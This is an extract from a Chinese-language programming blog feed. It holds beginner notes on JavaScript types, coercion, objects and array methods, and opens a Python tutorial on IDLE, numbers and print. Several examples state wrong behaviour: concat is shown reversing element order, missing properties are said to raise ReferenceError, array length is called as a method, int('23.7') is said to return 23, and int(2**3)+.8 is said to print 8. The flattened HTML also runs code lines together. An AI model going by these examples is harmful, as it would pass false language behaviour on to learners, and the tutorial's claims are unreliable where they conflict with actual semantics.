class="headerlink" title="基本数据类型"></a>基本数据类型</h3><h4 id="数值-Number"><a href="#数值-Number" class="headerlink" title="数值(Number)"></a>数值(Number)</h4><p>数值数据类型的变量可以是整数或浮点数<br>特殊字符串：</p><ul><li><font color="#fb8c00">NaN</font> Not a number,当算术表达式的运算结果不是数值类型时，例如字符串或Undefined</li><li><font color="#fb8c00">Positive Infinity</font> 数值太大超过javascript正数值范围</li><li><font color="#fb8c00">Negative Infinity</font> 数值太大超过Javascript负数值范围</li><li><font color="#fb8c00">Positive and Negative 0</font>　javascript用来区分+0和-0</li></ul><h5 id="NaN"><a href="#NaN" class="headerlink" title="NaN"></a>NaN</h5><pre class=" language-bash"><code class="language-bash">0/0<span class="token punctuation">;</span>  //NaNInfinity * Infinity<span class="token punctuation">;</span> //InfinityInfinity - Infinity<span class="token punctuation">;</span> //NaNNaN + 16<span class="token punctuation">;</span> //NaNNaN <span class="token operator">==</span><span class="token operator">=</span> NaN<span class="token punctuation">;</span> //<span class="token operator">==</span><span class="token operator">=</span>是严格相等操作符，详情参考下文，false0/0 <span class="token operator">==</span><span class="token operator">=</span> NaN<span class="token punctuation">;</span> //falseisNaN<span class="token punctuation">(</span>0/0<span class="token punctuation">)</span><span class="token punctuation">;</span>  //true isNaN可以解读为“不能转换成数值”</code></pre><blockquote><p>注：NaN不等于任何值，甚至不等于NaN  </p></blockquote><h5 id="精度的限制"><a href="#精度的限制" class="headerlink" title="精度的限制"></a>精度的限制</h5><p>javascript的数值与大多数编程语言一样，受到计算设备固定大小的物理元件的限制，存在精度限制。</p><pre class=" language-bash"><code class="language-bash">0.1 + 0.2 //结果是0.300000000000000044.18e-1000 //结果是0</code></pre><h4 id="字符串-String"><a href="#字符串-String" class="headerlink" title="字符串(String)"></a>字符串(String)</h4><pre class=" language-bash"><code class="language-bash"><span class="token string">"javascript"</span><span class="token string">"'hello' world"</span> //显示为<span class="token string">"hello"</span> world</code></pre><p>javascript字符串一个很重要的一个特性是不可变，不能对字符串中的字符进行修改，也不能改变字符串的长度。</p><pre class=" language-bash"><code class="language-bash">var s <span class="token operator">=</span> <span class="token string">"hello"</span><span class="token punctuation">;</span>s.toUpperCase<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> alert<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span> //结果仍为hello//因为第二行只是对原字符串执行了一次转换操作，对结果没有任何影响。</code></pre><blockquote><p>注：toUpperCase()函数作用是将字符串所有字母变成大写的形式<br>正确写法：</p></blockquote><pre class=" language-bash"><code class="language-bash">//方法一：直接打印var s <span class="token operator">=</span> <span class="token string">"hello"</span><span class="token punctuation">;</span>alert<span class="token punctuation">(</span>s.toUpperCase<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>//方法二：赋值给一个新变量var s <span class="token operator">=</span> <span class="token string">"hello"</span><span class="token punctuation">;</span>a <span class="token operator">=</span> s.toUpperCase<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>alert<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h4 id="Null"><a href="#Null" class="headerlink" title="Null"></a>Null</h4><p>Null数据类型只有一个值null,null是一个关键词不是0，如果变量值为null,表示变量没有值或不再指向任何对象地址。</p><h4 id="Undefined"><a href="#Undefined" class="headerlink" title="Undefined"></a>Undefined</h4><pre class=" language-bash"><code class="language-bash">undefined <span class="token operator">==</span> null, null <span class="token operator">==</span> undefined  //true,<span class="token operator">==</span>比较值undefined <span class="token operator">==</span><span class="token operator">=</span> null //false,<span class="token operator">==</span><span class="token operator">=</span>比较类型</code></pre><p>没有进行赋值的变量。</p><h2 id="数据类型转换"><a href="#数据类型转换" class="headerlink" title="数据类型转换"></a>数据类型转换</h2><h3 id="弱类型"><a href="#弱类型" class="headerlink" title="弱类型"></a>弱类型</h3><p>类型转换结果：</p><h4 id="数值"><a href="#数值" class="headerlink" title="数值"></a>数值</h4><ul><li>false被转换成0</li><li>true被转换成1</li><li>字符串被转换为最可能的数值，如果无法把字符串转成数值，则转换成NaN</li><li>null被转换成0</li><li>undefined被转换成NaN</li><li>空字符串或完全空白字符构成的字符串被转换成0</li></ul><h4 id="布尔值"><a href="#布尔值" class="headerlink" title="布尔值"></a>布尔值</h4><p>0、空字符串(“”)、null、undefined、NaN都会被转换成false，其他的都为true</p><h4 id="“-”的双重含义"><a href="#“-”的双重含义" class="headerlink" title="“+”的双重含义"></a>“+”的双重含义</h4><pre class=" language-bash"><code class="language-bash">//prompt<span class="token punctuation">(</span><span class="token punctuation">)</span>方法用于显示一个带有提示信息,并且用户可以输入的对话框。var x <span class="token operator">=</span> prompt<span class="token punctuation">(</span><span class="token string">"Enter a number:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  //输入2var y <span class="token operator">=</span> prompt<span class="token punctuation">(</span><span class="token string">"Enter a number:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  //输入2alert<span class="token punctuation">(</span>x+y<span class="token punctuation">)</span><span class="token punctuation">;</span>   //结果为22</code></pre><p>prompt求值的结果总是字符串，而操作符“+”正好适用于字符串和数值，在上述的代码中“+”体现了字符串连接的功能,(正确计算结果在显示转换中给出)。</p><blockquote><p>注：在javascript中，除了“+”，其他算术运算符均只能用于数值。</p></blockquote><h3 id="显式转换"><a href="#显式转换" class="headerlink" title="显式转换"></a>显式转换</h3><h4 id="显示转化的方式"><a href="#显示转化的方式" class="headerlink" title="显示转化的方式"></a>显示转化的方式</h4><pre class=" language-bash"><code class="language-bash"><span class="token string">"3.14"</span>-0<span class="token punctuation">;</span>  //3.14<span class="token string">"3.14"</span>*1<span class="token punctuation">;</span> //3.14<span class="token string">"3.14"</span>/1<span class="token punctuation">;</span> //3.14+<span class="token string">"3.14"</span><span class="token punctuation">;</span>  //3.14 一元加<span class="token punctuation">(</span>速度最快<span class="token punctuation">)</span>Number<span class="token punctuation">(</span><span class="token string">"3.14"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  //3.14parseFloat<span class="token punctuation">(</span><span class="token string">"3.14"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //3.14</code></pre><blockquote><p>注：单独的”+”放在数值之前不会产生任何操作，一元减操作符则不同，+4=&gt;4, -4=&gt;-4</p></blockquote><pre class=" language-bash"><code class="language-bash">var x <span class="token operator">=</span> +prompt<span class="token punctuation">(</span><span class="token string">"Enter a number:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  //输入2var y <span class="token operator">=</span> +prompt<span class="token punctuation">(</span><span class="token string">"Enter a number:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  //输入2alert<span class="token punctuation">(</span>x+y<span class="token punctuation">)</span><span class="token punctuation">;</span> //4</code></pre><blockquote><p>注：解决方法不唯一</p></blockquote><h4 id="数据类型相加"><a href="#数据类型相加" class="headerlink" title="数据类型相加"></a>数据类型相加</h4><pre class=" language-bash"><code class="language-bash">str <span class="token operator">=</span> <span class="token string">"hello"</span>num <span class="token operator">=</span> 2019bln <span class="token operator">=</span> <span class="token boolean">true</span>output <span class="token operator">=</span> str + num  //数值和字符串相加，数值会强制转换成字符串<span class="token string">"hello2019"</span>output <span class="token operator">=</span> str + bln  //布尔和字符串相加，布尔会强制转换成字符串<span class="token string">"hellotrue"</span>output <span class="token operator">=</span> num + bln  //布尔和数值相加，布尔会强制转换成数值 2019+1<span class="token operator">=</span>2020 </code></pre><blockquote><p>注：布尔转换为数值时，true的数值为1，false为0</p></blockquote><h4 id="用函数进行转换"><a href="#用函数进行转换" class="headerlink" title="用函数进行转换"></a>用函数进行转换</h4><h5 id="parseInt"><a href="#parseInt" class="headerlink" title="parseInt()"></a>parseInt()</h5><p>将字符串变量值开头的数值转换成整数，如果字符串没有数值，就返回NaN,在转换时可以指定十六、十和八进制。</p><pre class=" language-bash"><code class="language-bash">parseInt<span class="token punctuation">(</span><span class="token string">"3 page"</span><span class="token punctuation">)</span>   //3parseInt<span class="token punctuation">(</span><span class="token string">"3.2"</span><span class="token punctuation">)</span>  //3parseInt<span class="token punctuation">(</span><span class="token string">"page 3"</span><span class="token punctuation">)</span>  //NaN 开头不是数字parseInt<span class="token punctuation">(</span><span class="token string">"18ff值"</span>,16<span class="token punctuation">)</span>   //6399 将字符串转换成16进制</code></pre><h5 id="parseFloat"><a href="#parseFloat" class="headerlink" title="parseFloat()"></a>parseFloat()</h5><p>将字符串变量值开头的浮点数转换成浮点数，如果字符串没有数值，就返回NaN</p><pre class=" language-bash"><code class="language-bash">parseFloat<span class="token punctuation">(</span><span class="token string">"3.2"</span><span class="token punctuation">)</span>   //3.2parseFloat<span class="token punctuation">(</span><span class="token string">"page 3"</span><span class="token punctuation">)</span>  //NaN</code></pre><h5 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h5><p>将表达式的字符串参数当作表达式，函数可以返回表达式的计算结果</p><pre class=" language-bash"><code class="language-bash">eval<span class="token punctuation">(</span><span class="token string">"20+4*5"</span><span class="token punctuation">)</span>  //40eval<span class="token punctuation">(</span><span class="token string">"num = 1000"</span><span class="token punctuation">)</span>  //1000eval<span class="token punctuation">(</span><span class="token string">"5>4"</span><span class="token punctuation">)</span>   //true</code></pre><h5 id="typeof"><a href="#typeof" class="headerlink" title="typeof()"></a>typeof()</h5><p>获取变量的数据类型。</p><pre class=" language-bash"><code class="language-bash">var num <span class="token operator">=</span> 100<span class="token punctuation">;</span>typeof<span class="token punctuation">(</span>num<span class="token punctuation">)</span>   //number</code></pre><h3 id="松散相等操作符"><a href="#松散相等操作符" class="headerlink" title="松散相等操作符"></a>松散相等操作符</h3><ul><li>严格相等操作符===、!==：当且仅当两个表达式的值相同且类型相同时才返回true。</li><li>松散相等操作符==、!=：在测试之前会不顾一切地转换数据类型</li></ul><h2 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h2><h3 id="定义对象"><a href="#定义对象" class="headerlink" title="定义对象"></a>定义对象</h3><pre class=" language-bash"><code class="language-bash">var dress <span class="token operator">=</span> <span class="token punctuation">{</span>    size:4,  //属性    color:<span class="token string">"red"</span>,    price:200<span class="token punctuation">}</span><span class="token punctuation">;</span>var p <span class="token operator">=</span><span class="token punctuation">{</span>    name:<span class="token punctuation">{</span>first:<span class="token string">"Bob"</span>,last:<span class="token string">"Li"</span><span class="token punctuation">}</span>    birth:<span class="token punctuation">{</span>year:1999,month:2,day:2<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h4 id="读取属性"><a href="#读取属性" class="headerlink" title="读取属性"></a>读取属性</h4><p>定义对象之后，可以使用点或方括号读取属性的值</p><pre class=" language-bash"><code class="language-bash">dress.size  //4p.name<span class="token punctuation">[</span><span class="token string">"first"</span><span class="token punctuation">]</span>  //Bobp<span class="token punctuation">[</span><span class="token string">"birth"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"year"</span><span class="token punctuation">]</span>  //1999</code></pre><blockquote><p>注：点号访问属性的方式不能读取以整数命名的属性</p></blockquote><h4 id="属性的添加与删除"><a href="#属性的添加与删除" class="headerlink" title="属性的添加与删除"></a>属性的添加与删除</h4><pre class=" language-bash"><code class="language-bash">var dog <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>  //空对象dog.name <span class="token operator">=</span> <span class="token string">"hei"</span><span class="token punctuation">;</span>  //添加属性dog.breed <span class="token operator">=</span> <span class="token string">"hot"</span><span class="token punctuation">;</span>  //dog <span class="token operator">=</span> <span class="token punctuation">{</span>name:<span class="token string">"hei"</span>,breed:<span class="token string">"hot"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>delete dog.breed<span class="token punctuation">;</span>  //删除属性 dog <span class="token operator">=</span> <span class="token punctuation">{</span>name:<span class="token string">"hei"</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h4 id="对象引用"><a href="#对象引用" class="headerlink" title="对象引用"></a>对象引用</h4><p>对象表达式的值并非对象本身，而是一个指向对象的引用，对象的赋值不会产生新对象。</p><pre class=" language-bash"><code class="language-bash">var a <span class="token operator">=</span> 8<span class="token punctuation">;</span>var b <span class="token operator">=</span> <span class="token punctuation">{</span>x:1,y:2<span class="token punctuation">}</span><span class="token punctuation">;</span>var c <span class="token operator">=</span> a<span class="token punctuation">;</span>var d <span class="token operator">=</span> b<span class="token punctuation">;</span></code></pre><p>上述代码执行过程演示：<br><img src="https://i.postimg.cc/0yvvxmjs/1.jpg" alt=""></p><p>一个对象可以同时被多个变量引用，因此可以通过其中任何一个变量都可以修改对象的属性</p><pre class=" language-bash"><code class="language-bash">var a <span class="token operator">=</span><span class="token punctuation">{</span>x:1,y:2<span class="token punctuation">}</span><span class="token punctuation">;</span>var b <span class="token operator">=</span> a<span class="token punctuation">;</span>var c <span class="token operator">=</span> <span class="token punctuation">{</span>x:1,y:2<span class="token punctuation">}</span><span class="token punctuation">;</span>b.y <span class="token operator">=</span> 3<span class="token punctuation">;</span>alert<span class="token punctuation">(</span>a.y<span class="token punctuation">)</span><span class="token punctuation">;</span>  //3</code></pre><p>上述代码执行过程演示：<br><img src="https://i.postimg.cc/0yCsNQKJ/2.jpg" alt=""></p><h4 id="对象原型"><a href="#对象原型" class="headerlink" title="对象原型"></a>对象原型</h4><ul><li>创建一个对象的原型，然后再基于这个原型创建其他对象(相当于面向对象程序设计中的继承)。</li><li>每个Javascript对象都有一个暗藏的链接指向自己的原型对象。</li><li>如果你读取的属性不在对象身上，那么Javascript就会进一步查询这个对象的原型对象。。如果在这个原型对象上也没有找到，还会进一步查询原型对象的原型对象，以此类推。</li><li>如果整个原型链都没有你想读取的属性，就会产生ReferenceError的错误。<pre class=" language-bash"><code class="language-bash">var protoCircle <span class="token operator">=</span> <span class="token punctuation">{</span>x:0,y:0,color:<span class="token string">"black"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>  //圆的原型对象var c1 <span class="token operator">=</span> Object.create<span class="token punctuation">(</span>protoCircle<span class="token punctuation">)</span><span class="token punctuation">;</span>   //基于protoCircle创建一个c1对象c1.x <span class="token operator">=</span> 4<span class="token punctuation">;</span>c1.color <span class="token operator">=</span> <span class="token string">"red"</span><span class="token punctuation">;</span>   //c1 <span class="token operator">=</span> <span class="token punctuation">{</span>x:4,y:0,color:<span class="token string">"red"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>var c2 <span class="token operator">=</span> Object.create<span class="token punctuation">(</span>protoCircle<span class="token punctuation">)</span><span class="token punctuation">;</span>  //基于protoCircle创建一个c2对象c2.x <span class="token operator">=</span> 2<span class="token punctuation">;</span>c2.color <span class="token operator">=</span> <span class="token string">"yellow"</span><span class="token punctuation">;</span>   //c2 <span class="token operator">=</span> <span class="token punctuation">{</span>x:2,y:0,color:<span class="token string">"yellow"</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre></li></ul><blockquote><p>注：上例c1\c2属于多个对象共享一个原型</p></blockquote><h4 id="自引用对象"><a href="#自引用对象" class="headerlink" title="自引用对象"></a>自引用对象</h4><p>对象的属性可以引用自身，两个对象也可以通过属性互相引用。</p><pre class=" language-bash"><code class="language-bash">var mom <span class="token operator">=</span><span class="token punctuation">{</span>name:<span class="token string">"Alice"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>var dad <span class="token operator">=</span> <span class="token punctuation">{</span>name:<span class="token string">"Bob"</span>,spouse:mom<span class="token punctuation">}</span>mom.spouse <span class="token operator">=</span> dad<span class="token punctuation">;</span></code></pre><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><p>数组是一种特殊的对象，它的属性是从0开始的非负整数，还有一个名为length的对应属性。</p><pre class=" language-bash"><code class="language-bash">var a <span class="token operator">=</span> <span class="token punctuation">[</span>1,2,3,4,5<span class="token punctuation">]</span><span class="token punctuation">;</span>  //a<span class="token punctuation">[</span>0<span class="token punctuation">]</span>的值为1，a.length<span class="token punctuation">(</span><span class="token punctuation">)</span>等于5a<span class="token punctuation">[</span>20<span class="token punctuation">]</span> <span class="token operator">=</span> 6<span class="token punctuation">;</span> //将a<span class="token punctuation">[</span>20<span class="token punctuation">]</span>赋值为6,a<span class="token punctuation">[</span>5<span class="token punctuation">]</span>到a<span class="token punctuation">[</span>19<span class="token punctuation">]</span>都是Undefinedalert<span class="token punctuation">(</span>a.length<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>  //21a.length <span class="token operator">=</span> 50<span class="token punctuation">;</span>  //a<span class="token punctuation">[</span>21<span class="token punctuation">]</span>到a<span class="token punctuation">[</span>49<span class="token punctuation">]</span>都是Undefineda.length <span class="token operator">=</span> 3<span class="token punctuation">;</span>  //a <span class="token operator">=</span> <span class="token punctuation">[</span>1,2,3<span class="token punctuation">]</span></code></pre><h3 id="数组的方法"><a href="#数组的方法" class="headerlink" title="数组的方法"></a>数组的方法</h3><p>####　split()<br>s.split(分隔符)表示将s以分隔符隔开形成新的数组，分隔符可以为”,”、” “等</p><pre class=" language-bash"><code class="language-bash">var s <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"hello world"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>var a <span class="token operator">=</span> s.split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  //</code></pre><h4 id="slice"><a href="#slice" class="headerlink" title="slice()"></a>slice()</h4><p>b.slice(n,m)表示将数组b从b[n]切割到b<a href="类似于Python中的切片">m-1</a></p><pre class=" language-bash"><code class="language-bash">var b <span class="token operator">=</span> <span class="token punctuation">[</span>1,2,3,4,5,6<span class="token punctuation">]</span><span class="token punctuation">;</span>var a <span class="token operator">=</span> b.slice<span class="token punctuation">(</span>2,5<span class="token punctuation">)</span><span class="token punctuation">;</span>  // a <span class="token operator">=</span> <span class="token punctuation">[</span>3,4,5<span class="token punctuation">]</span>var c <span class="token operator">=</span> b.slice<span class="token punctuation">(</span><span class="token punctuation">)</span>  //所有索引，得到b的副本</code></pre><h4 id="concat"><a href="#concat" class="headerlink" title="concat()"></a>concat()</h4><p>将两个数组拼接起来</p><pre class=" language-bash"><code class="language-bash">var a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"A"</span>,<span class="token string">"hello"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>var b <span class="token operator">=</span> <span class="token punctuation">[</span>1,2,3,4<span class="token punctuation">]</span><span class="token punctuation">;</span>var c <span class="token operator">=</span> a.concat<span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>  //c <span class="token operator">=</span> <span class="token punctuation">[</span>1,2,3,4,<span class="token string">"A"</span>,<span class="token string">"hello"</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre><h4 id="join"><a href="#join" class="headerlink" title="join()"></a>join()</h4><p>把数组元素连接起来可以创建一个由同一个分隔符分隔的字符串。</p><pre class=" language-bash"><code class="language-bash">var a <span class="token operator">=</span> <span class="token punctuation">[</span>1,2,4,<span class="token string">"hello"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>alert<span class="token punctuation">(</span>a.join<span class="token punctuation">(</span><span class="token string">"**"</span><span class="token punctuation">))</span><span class="token punctuation">;</span>  //<span class="token punctuation">[</span>1**2**4**hello<span class="token punctuation">]</span></code></pre><h4 id="可变操作"><a href="#可变操作" class="headerlink" title="可变操作"></a>可变操作</h4><p>可以修改数组本身的操作称为可变操作</p><h5 id="push-unshift"><a href="#push-unshift" class="headerlink" title="push()\unshift()"></a>push()\unshift()</h5><p>push()在数组末尾添加元素,unshift()在数组开头添加元素</p><pre class=" language-bash"><code class="language-bash">var b <span class="token operator">=</span> <span class="token punctuation">[</span>1,2<span class="token punctuation">]</span><span class="token punctuation">;</span>b.push<span class="token punctuation">(</span>3<span class="token punctuation">)</span> <span class="token punctuation">;</span>  //b <span class="token operator">=</span> <span class="token punctuation">[</span>1,2,3<span class="token punctuation">]</span>b.unshift<span class="token punctuation">(</span>0<span class="token punctuation">)</span><span class="token punctuation">;</span>  // b <span class="token operator">=</span> <span class="token punctuation">[</span>0,1,2,3<span class="token punctuation">]</span></code></pre><h5 id="pop-shift"><a href="#pop-shift" class="headerlink" title="pop()\shift()"></a>pop()\shift()</h5><p>pop()在数组末尾删除元素，shift()在数组开头删除元素</p><pre class=" language-bash"><code class="language-bash">var a <span class="token operator">=</span> <span class="token punctuation">[</span>1,2,3,4<span class="token punctuation">]</span><span class="token punctuation">;</span>a.pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  // a<span class="token operator">=</span><span class="token punctuation">[</span>1,2,3<span class="token punctuation">]</span>a.shift<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  //a<span class="token operator">=</span><span class="token punctuation">[</span>2,3<span class="token punctuation">]</span></code></pre><h5 id="sort"><a href="#sort" class="headerlink" title="sort()"></a>sort()</h5><p>对数组元素进行排序</p><pre class=" language-bash"><code class="language-bash">var a <span class="token operator">=</span> <span class="token punctuation">[</span>7,3,5,2,10,1<span class="token punctuation">]</span><span class="token punctuation">;</span>a.sort<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  //a <span class="token operator">=</span> <span class="token punctuation">[</span>1,10,2,3,5,7<span class="token punctuation">]</span>,字符串10小于2</code></pre><blockquote><p>注：javascript默认是将所有数组元素都当成字符串来排序。</p></blockquote><h5 id="reverse"><a href="#reverse" class="headerlink" title="reverse()"></a>reverse()</h5><p>反转数组元素的顺序</p><h4 id="filter"><a href="#filter" class="headerlink" title="filter()"></a>filter()</h4><ul><li>创建一个数组，其中填充了通过测试（作为函数提供）的所有数组元素。</li><li>不为没有值的数组元素执行函数</li><li>不更改原始数组</li></ul><h4 id="map"><a href="#map" class="headerlink" title="map()"></a>map()</h4><ul><li>方法的作用是：创建一个新数组，并为每个数组元素调用一个函数。</li><li>按顺序为数组中的每个元素调用提供的函数一次。</li><li>此方法不会更改原始数组</li></ul><h4 id="reduce"><a href="#reduce" class="headerlink" title="reduce()"></a>reduce()</h4><ul><li>接收一个函数作为累加器，数组中的每个值（从左到右）开始缩减，最终计算为一个值。</li><li>函数的返回值存储在累加器中（result/total）</li></ul>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python(一)</title>
      <link href="/2019/09/08/python-1/"/>
      <url>/2019/09/08/python-1/</url>
      
        <content type="html"><![CDATA[<h2 id="IDLE"><a href="#IDLE" class="headerlink" title="IDLE"></a>IDLE</h2><p>IDLE是一个PythonShell,（安装结束后在开始菜单键入idle打开）shell的意思就是“外壳”，基本上来说，就是一个通过键入文本与程序交互的途径</p><h2 id="关于python"><a href="#关于python" class="headerlink" title="关于python"></a>关于python</h2><ul><li>在python中，缩进具有语法意义</li><li>程序块：<pre class=" language-bash"><code class="language-bash"><span class="token keyword">for</span> line <span class="token keyword">in</span> line:  print<span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span></code></pre></li><li>程序块中的每一行用4个空格进行缩进，在程序中，每一个程序块头是循环结构或判断结构的开始</li><li>python被称为块结构语言(block-structured language)，一个程序块可以嵌套在另一个程序块里。</li><li>程序文档是注释的集合</li></ul><h3 id="函数和方法"><a href="#函数和方法" class="headerlink" title="函数和方法"></a>函数和方法</h3><p>函数和方法的不同之处</p><ol><li>作用域：</li></ol><ul><li>函数：从函数调用开始至函数执行完成，返回给调用者后，在执行过程中开辟的空间会自动释放，也就是说函数执行完成后，函数体内部通过赋值等方式修改变量的值不会保留，会随着返回给调用者后，开辟的空间会自动释放。</li><li>方法：通过实例化的对象进行方法的调用，调用后开辟的空间不会释放，也就是说调用方法中对变量的修改值会一直保留。</li></ul><ol start="2"><li>调用方法：</li></ol><ul><li>函数：通过“函数名（）”的方式进行调用</li><li>方法：通过“对象.方法名”的方式进行调用。</li></ul><ol start="3"><li>参数传递方式</li></ol><ul><li>函数：显式传递</li><li>方法：隐式传递</li></ul><blockquote><p>注：方法是一种特殊的函数</p></blockquote><h2 id="数值"><a href="#数值" class="headerlink" title="数值"></a>数值</h2><h3 id="处理数值类型的函数"><a href="#处理数值类型的函数" class="headerlink" title="处理数值类型的函数"></a>处理数值类型的函数</h3><ul><li><font color="#fb8c00">abs()</font>绝对值函数</li><li><font color="#fb8c00">int()</font>保持整数不变，并将浮点数通过丢弃小数部分转换为整数</li><li><font color="#fb8c00">round(n,r)</font>四舍五入保留n的小数点后r位<pre class=" language-bash"><code class="language-bash">a <span class="token operator">=</span> 2b <span class="token operator">=</span> 3print<span class="token punctuation">(</span>abs<span class="token punctuation">(</span>1-<span class="token punctuation">(</span>4*b<span class="token punctuation">))</span>  <span class="token comment" spellcheck="true">#11</span>print<span class="token punctuation">(</span>int<span class="token punctuation">(</span>a**b<span class="token punctuation">)</span>+.8<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#表示2^3+0.8，结果为8</span>print<span class="token punctuation">(</span>round<span class="token punctuation">(</span>a/b,3<span class="token punctuation">))</span>  <span class="token comment" spellcheck="true">#0.667</span></code></pre></li></ul><h3 id="增量赋值"><a href="#增量赋值" class="headerlink" title="增量赋值"></a>增量赋值</h3><p><font color="#fb8c00">var += n</font> +=可看成执行了一个增量赋值，即 var = var + n，其他增量赋值运算符有-=、<em>=、/=、</em></p><pre class=" language-bash"><code class="language-bash">num1 <span class="token operator">=</span> 6num1 +<span class="token operator">=</span> 1 <span class="token comment" spellcheck="true"># 7</span>num2 <span class="token operator">=</span>7num 2 -<span class="token operator">=</span> 5 <span class="token comment" spellcheck="true">#2</span>num3 <span class="token operator">=</span> 8num3 /<span class="token operator">=</span> 2 <span class="token comment" spellcheck="true">#4</span>num4 <span class="token operator">=</span> 1num4 *<span class="token operator">=</span> 3 <span class="token comment" spellcheck="true">#3</span>num5 <span class="token operator">=</span> 2num5 **<span class="token operator">=</span> 3 <span class="token comment" spellcheck="true">#8 表示2^3</span></code></pre><h2 id="python输入输出"><a href="#python输入输出" class="headerlink" title="python输入输出"></a>python输入输出</h2><h3 id="print-函数"><a href="#print-函数" class="headerlink" title="print 函数"></a>print 函数</h3><ol><li><p>自动计算</p><pre class=" language-bash"><code class="language-bash">print<span class="token punctuation">(</span>5+3<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#输出为8</span></code></pre></li><li><p>连接字符串</p><pre class=" language-bash"><code class="language-bash">print<span class="token punctuation">(</span><span class="token string">"hello"</span>+<span class="token string">"world"</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#输出hellowrold</span></code></pre></li><li><p>重复输出</p><pre class=" language-bash"><code class="language-bash">print<span class="token punctuation">(</span><span class="token string">"hello world"</span>*8<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#将hello world 重复输出8遍</span></code></pre></li><li><p>eval/int/float/str函数   </p><pre class=" language-bash"><code class="language-bash">print <span class="token punctuation">(</span>int<span class="token punctuation">(</span><span class="token string">"23.7"</span><span class="token punctuation">))</span>   <span class="token comment" spellcheck="true">#23</span>print <span class="token punctuation">(</span>float<span class="token punctuation">(</span><span class="token string">"23"</span><span class="token punctuation">))</span>   <span class="token comment" spellcheck="true">#23.0</span>print <span class="token punctuation">(</span>eval<span class="token punctuation">(</span><span class="token string">"2+3*3"</span><span class="token punctuation">))</span>  <span class="token comment" spellcheck="true">#11  eval函数将计算相应表达式，赋值为合适的整型或浮点型</span></code></pre></li><li><p>end参数<br><font color="#fb8c00">print(value0,value1,…..,end=endString)</font>  末尾显示endString</p><pre class=" language-bash"><code class="language-bash">print<span class="token punctuation">(</span><span class="token string">"hello"</span>,end<span class="token operator">=</span><span class="token string">","</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#末尾显示","，代替换行参数</span>print<span class="token punctuation">(</span><span class="token string">"world"</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">#hello,world</span></code></pre></li></ol><blockquote><p>注：print函数会触发一个换行操作，意味着下一个Print函数的输出将从新的一行开始</p></blockquote><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>python的变量与其他语言不同，python并不把值存储在变量中，而更像把名字贴在值上面（有些python程序员会说Python没有变量，只有名字）</p><pre class=" language-bash"><code class="language-bash">first <span class="token operator">=</span> 3second <span class="token operator">=</span> 2print<span class="token punctuation">(</span>first + second<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#5</span></code></pre><blockquote><p>注： 1.在使用变量之前要先对其赋值<br>       2.变量不能以数字开头<br>       3.python区分大小写</p></blockquote><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><p>字符串字面量是字符构成的一个序列，并视其为一个整体。</p><h3 id="文本"><a href="#文本" class="headerlink" title="文本"></a>文本</h3><p>字符串也可以叫文本，文本与数字不同<br>数字</p><pre class=" language-bash"><code class="language-bash">first <span class="token operator">=</span> 3+5print<span class="token punctuation">(</span>first<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#8</span></code></pre><p>文本</p><pre class=" language-bash"><code class="language-bash">first <span class="token operator">=</span> <span class="token string">'3'</span>+<span class="token string">'5'</span>print<span class="token punctuation">(</span>first<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#35</span></code></pre><h3 id="转义符号"><a href="#转义符号" class="headerlink" title="转义符号"></a>转义符号</h3><h4 id="反斜杠"><a href="#反斜杠" class="headerlink" title="反斜杠\"></a>反斜杠\</h4><p><font color="#fb8c00"> \反斜杠 </font>续行符<br><font color="#fb8c00">\r</font>回车<br><font color="#fb8c00">\b</font>退格<br><font color="#fb8c00">\f</font>换页<br><font 